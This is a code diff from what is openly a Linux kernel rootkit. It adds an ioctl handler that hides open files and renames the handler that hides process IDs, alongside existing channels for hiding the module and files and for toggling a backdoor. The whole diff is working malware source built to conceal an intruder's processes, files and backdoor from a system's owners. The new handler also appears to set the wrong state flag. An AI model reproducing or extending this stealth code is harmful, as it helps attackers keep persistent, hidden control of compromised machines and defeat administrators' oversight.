@@ -9,7 +9,7 @@
 #include "modhide.h"
 #include "filehide.h"
 #include "backdoor.h"
-#include "hidepid.h"
+#include "pidhide.h"
 #include "ioctl.h"
 #include "rootkit.h"
 
@@ -25,9 +25,10 @@ report_channels(void)
     DEBUG_NOTICE("%-24s %#10lx\n", "PING",     G7_PING);
     DEBUG_NOTICE("%-24s %#10lx\n", "MODHIDE",  G7_MODHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "FILEHIDE", G7_FILEHIDE);
+    DEBUG_NOTICE("%-24s %#10lx\n", "OPENHIDE", G7_OPENHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "BACKDOOR", G7_BACKDOOR);
     DEBUG_NOTICE("%-24s %#10lx\n", "TOGGLEBD", G7_TOGGLEBD);
-    DEBUG_NOTICE("%-24s %#10lx\n", "HIDEPID",  G7_HIDEPID);
+    DEBUG_NOTICE("%-24s %#10lx\n", "HIDEPID",  G7_PIDHIDE);
     DEBUG_NOTICE("-----------------------------------\n");
 }
 
@@ -38,9 +39,10 @@ detect_channel(unsigned cmd)
     case G7_PING:     return (channel_t){ "PING",     handle_ping     };
     case G7_MODHIDE:  return (channel_t){ "MODHIDE",  handle_modhide  };
     case G7_FILEHIDE: return (channel_t){ "FILEHIDE", handle_filehide };
+    case G7_OPENHIDE: return (channel_t){ "OPENHIDE", handle_openhide };
     case G7_BACKDOOR: return (channel_t){ "BACKDOOR", handle_backdoor };
     case G7_TOGGLEBD: return (channel_t){ "TOGGLEBD", handle_togglebd };
-    case G7_HIDEPID:  return (channel_t){ "HIDEPID",  handle_hidepid  };
+    case G7_PIDHIDE:  return (channel_t){ "HIDEPID",  handle_pidhide  };
     }
 
     return (channel_t){ "unknown", NULL };
@@ -124,6 +126,51 @@ handle_filehide(unsigned long arg)
 }
 
 int
+handle_openhide(unsigned long arg)
+{
+    long sarg = (long)arg;
+    bool set = rootkit.hiding_open;
+
+    if (sarg > 0 || (!sarg && (set ^ 1))) {
+        hide_open();
+        rootkit.hiding_files = 1;
+    } else if (sarg < 0 || (!sarg && !(set ^ 1))) {
+        unhide_open();
+        rootkit.hiding_files = 0;
+    }
+
+    DEBUG_NOTICE("openhide %s\n", rootkit.hiding_open ? "on" : "off");
+
+    return 0;
+}
+
+int
+handle_pidhide(unsigned long arg)
+{
+    long sarg = (long)arg;
+
+    if (!sarg) {
+        unhide_pids();
+        rootkit.hiding_pids = 0;
+        DEBUG_NOTICE("pidhide off\n");
+    } else if (sarg < 0) {
+        unhide_pid((pid_t)(-sarg));
+        DEBUG_NOTICE("unhiding pid %ld\n", -sarg);
+    } else if (sarg > 0) {
+        if (!rootkit.hiding_pids) {
+            hide_pids();
+            DEBUG_NOTICE("pidhide on\n");
+        }
+
+        hide_pid((pid_t)sarg);
+        rootkit.hiding_pids = 1;
+        DEBUG_NOTICE("hiding pid %ld\n", sarg);
+    }
+
+    return 0;
+}
+
+int
 handle_backdoor(unsigned long arg)
 {
     char buf[BUFLEN];
@@ -176,32 +223,6 @@ handle_togglebd(unsigned long arg)
     }
 
     DEBUG_NOTICE("backdoor %s\n", msg);
-
-    return 0;
-}
-
-int
-handle_hidepid(unsigned long arg)
-{
-    long sarg = (long)arg;
-
-    if (!sarg) {
-        unhide_pids();
-        rootkit.hiding_pids = 0;
-        DEBUG_NOTICE("hidepid off\n");
-    } else if (sarg < 0) {
-        unhide_pid((pid_t)(-sarg));
-        DEBUG_NOTICE("unhiding pid %ld\n", -sarg);
-    } else if (sarg > 0) {
-        if (!rootkit.hiding_pids) {
-            hide_pids();
-            DEBUG_NOTICE("hidepid on\n");
-        }
-
-        hide_pid((pid_t)sarg);
-        rootkit.hiding_pids = 1;
-        DEBUG_NOTICE("hiding pid %ld\n", sarg);
-    }
 
     return 0;
 }
